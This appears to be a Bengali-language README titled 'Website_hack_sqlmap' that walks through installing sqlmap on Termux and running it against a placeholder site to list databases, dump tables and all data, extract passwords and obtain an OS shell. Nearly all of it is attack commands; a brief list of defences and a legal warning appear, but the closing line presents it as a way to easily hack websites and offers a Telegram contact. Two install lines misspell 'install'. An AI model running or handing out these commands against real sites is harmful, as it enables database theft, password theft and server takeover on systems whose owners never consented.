# Website_hack_sqlmap


### **Termux-এ SQLMap ব্যবহারের সম্পূর্ণ গাইডলাইন**  

Termux-এ **SQLMap** ব্যবহার করে SQL ইনজেকশন পরীক্ষা করা সহজ, তবে এর জন্য কিছু সেটআপ করতে হবে।  

---

## **1️⃣ Termux-এ SQLMap ইনস্টলেশন**  

### **🔹 ধাপ 1: Termux আপডেট করুন**  
```bash
pkg update && pkg upgrade -y
```

### **🔹 ধাপ 2: প্রয়োজনীয় প্যাকেজ ইনস্টল করুন**  
```bash
pkg install python -y
pkg instoll python2 -y
pkg instoll git -y
```

### **🔹 ধাপ 3: SQLMap ক্লোন করুন**  
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```

### **🔹 ধাপ 4: SQLMap ফোল্ডারে যান**  
```bash
cd sqlmap
```

### **🔹 ধাপ 5: SQLMap রান করুন**  
```bash
python sqlmap.py --help
```

---

## **2️⃣ SQLMap ব্যবহারের মূল কমান্ড**  

### **🔹 1. SQL ইনজেকশন চেক করা**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs
```
**👉 এটি টার্গেট ওয়েবসাইটে SQL ইনজেকশন আছে কিনা তা পরীক্ষা করবে এবং ডাটাবেস লিস্ট দেখাবে।**  

---

### **🔹 2. নির্দিষ্ট ডাটাবেসের টেবিল লিস্ট বের করা**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" -D database_name --tables
```

---

### **🔹 3. নির্দিষ্ট টেবিলের কলাম লিস্ট বের করা**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
```

---

### **🔹 4. নির্দিষ্ট কলাম থেকে তথ্য বের করা**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
```

---

### **🔹 5. সম্পূর্ণ ডাটাবেসের তথ্য বের করা**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --dump-all
```

---

### **🔹 6. লগইন পাসওয়ার্ড বের করা**  
```bash
python sqlmap.py -u "http://target.com/login.php" --passwords
```

---

### **🔹 7. ওয়েবসাইটে শেল (Shell Access) নেওয়া**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
```

---

## **3️⃣ Termux-এ SQLMap দিয়ে গভীর স্ক্যান করা**  

### **🔹 1. ওয়েবসাইটের ইনজেকশন ধরার জন্য ডিপ স্ক্যান**  
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --level=5 --risk=3 --dbs
```
**👉 `--level=5` এবং `--risk=3` ব্যবহার করলে গভীরভাবে SQL ইনজেকশন পরীক্ষা করা যাবে।**  

---

## **4️⃣ প্রতিরোধ ব্যবস্থা:**  
✅ **Prepared Statements ব্যবহার করুন**  
✅ **User Input Validation করুন**  
✅ **WAF (Web Application Firewall) ব্যবহার করুন**  
✅ **ডাটাবেসের অপ্রয়োজনীয় পারমিশন বন্ধ করুন**  

---

## **⚠️ সতর্কতা:**  
❌ **SQLMap অন্যের অনুমতি ছাড়া ব্যবহার করা আইনত অপরাধ।**  
❌ **শুধুমাত্র সিকিউরিটি টেস্টিং ও লার্নিং পারপাসের জন্য ব্যবহার করুন।**  

---

## **🔹 শেষ কথা**  
Termux-এ SQLMap সেটআপ ও ব্যবহারের এই গাইড অনুসরণ করলে আপনি সহজেই website hack করতে পারবেন। 
যদি আরও কিছু জানতে চান যোগাযোগ করতে পারেন 
Telegram: t.me/Romzan_99 
